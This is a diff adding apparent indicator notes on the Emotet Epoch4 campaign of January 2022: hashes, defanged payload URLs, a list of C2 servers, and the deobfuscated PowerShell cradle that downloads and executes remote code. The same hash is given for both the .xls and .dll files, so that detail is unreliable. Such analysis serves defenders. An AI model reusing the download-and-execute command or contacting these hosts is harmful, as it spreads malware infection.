@@ -1,0 +1,85 @@
+Emotet 2022
+
+************************************************************************************************************
+
+Epoch4 - xls > .hta > .ps > .dll - 27/01/2022
+
+.xls 7053c10fc8ee8b9f27ba7cdcd6a14bda48fa75df99adfb421be7f9ebe0e64e2f
+
+.dll 7053c10fc8ee8b9f27ba7cdcd6a14bda48fa75df99adfb421be7f9ebe0e64e2f
+
+hxxp://91.240.118.168/zzx/ccv/fe.html
+
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('hxxp://91.240.118.168/zzx/ccv/fe.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.168/zzx/ccv/fe.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.168/zzx/ccv/fe.png')"|invoke-expression
+# powershell snippet 1
+(new-object net.webclient).downloadstring("hxxp://91.240.118.168/zzx/ccv/fe.png")
+
+$path = "C:\Users\Public\Documents\ssd.dll
+
+hxxps://www.yeald.finance/wp-admin/1WgPRm/
+hxxp://sneakadream.com/wp-content/pccmAOq/
+hxxps://umanostudio.com/wp-admin/n1LG7aJnptBlQkC/
+hxxps://weddingbandsirelandjbk.com/hgsynt2/o/
+hxxps://getcode.info/wp-content/QDx8b5j/
+hxxps://falah.org.pk/vegasvulkan1000.falah.org.pk/ZBRx4QuUXfLH/
+hxxps://chochungcuhanoi.com/wp-content/cyE2u0cnolP/
+hxxps://allaagency.ro/wp-admin/7/
+hxxp://taxxooblog.cn/wp-includes/KJLv/
+hxxps://palankhir.hu/tools/GJRNhZHz/
+hxxp://masboni.com/wp-admin/3zUQl/
+hxxps://tanquessepticos.com/wp-admin/ApVVbl1fQ0/
+hxxp://starspeedng.com/One-File/U3Trml/
+
+
+c2's
+
+89.32.148.223:443
+188.40.137.206:8080
+45.118.135.203:7080
+164.68.99.3:8080
+162.214.50.39:7080
+45.142.114.231:8080
+45.176.232.124:443
+207.38.84.195:8080
+104.168.155.129:8080
+176.104.106.96:8080
+203.114.109.124:443
+41.76.108.46:8080
+178.79.147.66:8080
+58.227.42.236:80
+51.38.71.0:443
+138.185.72.26:8080
+107.182.225.142:8080
+81.0.236.90:443
+185.157.82.211:8080
+103.8.26.103:8080
+50.116.54.215:443
+217.182.143.207:443
+46.55.222.11:443
+173.212.193.249:8080
+212.237.17.99:8080
+79.172.212.216:8080
+192.254.71.210:443
+212.237.5.209:443
+69.197.160.180:8080
+209.59.138.75:7080
+110.232.117.186:8080
+104.251.214.46:8080
+195.154.133.20:443
+216.158.226.206:443
+158.69.222.101:443
+129.232.188.93:443
+45.118.115.99:8080
+212.237.56.116:7080
+103.75.201.2:443
+131.100.24.231:80
+212.24.98.99:8080
+200.17.134.35:7080
+162.243.175.63:443
+103.8.26.102:8080
+178.63.25.185:443
+
